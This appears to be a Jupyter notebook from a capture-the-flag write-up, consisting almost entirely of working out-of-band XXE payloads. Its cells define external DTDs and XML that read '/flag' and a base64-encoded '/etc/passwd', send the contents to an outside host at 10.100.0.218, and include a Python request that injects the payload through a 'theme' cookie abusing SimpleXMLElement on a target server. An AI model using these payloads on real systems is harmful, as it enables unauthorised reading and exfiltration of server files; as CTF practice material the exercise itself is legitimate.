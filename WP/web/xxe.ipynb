{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- dtd内容为\n",
    "```xml\n",
    "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://10.100.0.218/p=%file;'>\">\n",
    "```\n",
    "- xml内容为\n",
    "```xml\n",
    "<?xml version=\"1.0\"?> \n",
    "<!DOCTYPE data [\n",
    "<!ENTITY % file SYSTEM \"file:///flag\"> \n",
    "<!ENTITY % dtd SYSTEM \"http://10.100.0.218/a.dtd\"> \n",
    "%dtd;\n",
    "%all;\n",
    "]> \n",
    "<data>&send;</data> \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### \n",
    "- eval.xml\n",
    "```xml\n",
    "<?xml version=\"1.0\"?> \n",
    "<!DOCTYPE data [\n",
    "<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\"> \n",
    "<!ENTITY % dtd SYSTEM \"http://10.100.0.218/send.xml\"> \n",
    "%dtd;\n",
    "%all;\n",
    "]> \n",
    "<data>&send;</data> \n",
    "```\n",
    "- send.xml\n",
    "```xml\n",
    "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://10.100.0.218/?p=%file;'>\">\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "url='http://10.101.0.5/' \n",
    "cookie={'theme':'SimpleXMLElement-http://10.100.0.218/eval.xml-2-2'}\n",
    "requests.get(url,cookies=cookie)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
